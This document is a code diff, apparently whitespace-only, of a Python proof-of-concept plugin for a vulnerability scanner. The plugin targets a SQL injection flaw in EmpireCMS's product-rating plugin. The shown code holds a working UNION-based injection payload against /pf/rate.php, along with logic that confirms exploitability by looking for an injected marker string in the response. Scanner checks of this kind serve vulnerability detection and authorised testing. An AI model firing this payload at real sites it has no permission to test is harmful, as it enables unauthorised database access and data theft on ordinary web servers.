@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'EmpireCMS_0002'  # 平台漏洞编号，留空
     name = '帝国CMS商品评分插件 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         帝国CMS（EmpireCMS）商品评分插件注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'EmpireCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'def04391-42be-45e6-a2ac-1f8172610aa2'
@@ -34,12 +36,12 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             arg = self.target
-            payload = '/pf/rate.php?id=-1+UNION+ALL+SELECT+NULL,CONCAT(0x23,0x747971,0x23)--' 
-            target = arg + payload 
-            code, head,res, errcode, _   = hh.http(target)
+            payload = '/pf/rate.php?id=-1+UNION+ALL+SELECT+NULL,CONCAT(0x23,0x747971,0x23)--'
+            target = arg + payload
+            code, head, res, errcode, _ = hh.http(target)
 
             if code == 200 and '#tyq#' in res:
-                #security_hole(target)
+                # security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -48,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
